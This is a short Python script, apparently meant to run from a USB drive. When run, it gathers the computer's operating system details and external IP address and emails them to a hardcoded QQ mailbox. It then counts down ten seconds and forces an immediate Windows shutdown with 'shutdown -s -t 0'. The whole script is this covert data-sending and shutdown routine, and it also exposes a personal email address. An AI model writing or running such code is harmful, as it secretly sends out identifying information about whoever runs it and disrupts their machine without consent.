import platform
import requests
from bs4 import BeautifulSoup
import smtplib
from email.mime.text import MIMEText
from email.utils import formataddr
import os
import time


#获取这台电脑的操作系统信息
class get_system_information:
    def system_information(self):
        return platform.platform()

#获取这台电脑的外网IP地址
class get_ip_address:

    def __init__(self,url="https://www.ip138.com/",targetelement="a"):
        self.url=url
        self.targetelement=targetelement

    def ip_address(self):
        try:
            r=requests.get(self.url,headers={"User-Agent":"Chrome11.0:Mozilla/5.0 (compatible) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.682.0 Safari/534.21"})
            r.raise_for_status
            r.encoding=r.apparent_encoding
            msg=BeautifulSoup(r.text,"html.parser").iframe
            search_ip=msg["src"]    #获取查询ip的源地址
            iptext=requests.get("http:"+search_ip,headers={"User-Agent":"Chrome11.0:Mozilla/5.0 (compatible) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.682.0 Safari/534.21"})
            ipaddr=BeautifulSoup(iptext.text,"html.parser")
            return ipaddr.find("a").text
        except:
            return "出于某些原因，无法获取到ip"

#操作机器关机或者是其他活动
class control_the_machine:
    def __init__(self,cmd_order):
        self.cmd_order=cmd_order

    def restart(self):
        result_class=os.popen(self.cmd_order)
        time.sleep(60)
        EndResult=result_class.read()

        return "已经操作该机器关机"

# print(shutdown_the_machine("ls").restart())

class sendemail:
    def __init__(self,account="3286258758@qq.com",passwd="",target_account="3286258758@qq.com"):

        self.account=account
        self.passwd=passwd
        self.target_account=target_account

    def send_email(self,message):

        #发送信息的内容
        try:
            msg=MIMEText(message,"plain","utf-8")
            msg['From']=formataddr(["巨大的猫猫",self.account])  # 括号里的对应发件人邮箱昵称、发件人邮箱账号
            msg['To']=formataddr(["巨大的猫猫",self.target_account])              # 括号里的对应收件人邮箱昵称、收件人邮箱账号
            msg['Subject']="U盘位置信息"

        #链接第三方服务器

            server=smtplib.SMTP_SSL("smtp.qq.com", 465)  # 发件人邮箱中的SMTP服务器，端口是25
            server.login(self.account,self.passwd)  # 括号中对应的是发件人邮箱账号、邮箱密码
            server.sendmail(self.account,[self.target_account,],msg.as_string())  # 括号中对应的是发件人邮箱账号、收件人邮箱账号、发送邮件
            server.quit()  # 关闭连接
            return "位置信息已经发送"
        
        except:
            return "信息发送失败"

        
message=" 操作系统信息:{}\n ip地址为{}\n 已经操作这台机器关机".format(get_system_information().system_information(),
                                                                    get_ip_address().ip_address(),
                                                                    time.asctime(time.localtime(time.time())))
print(sendemail().send_email(message))
print('你有十秒钟的时间拔出U盘')
for i in range(10):
    print("还剩{}s".format(10-(i+1)))
    time.sleep(1)
control_the_machine("shutdown -s -t 0").restart()    





        
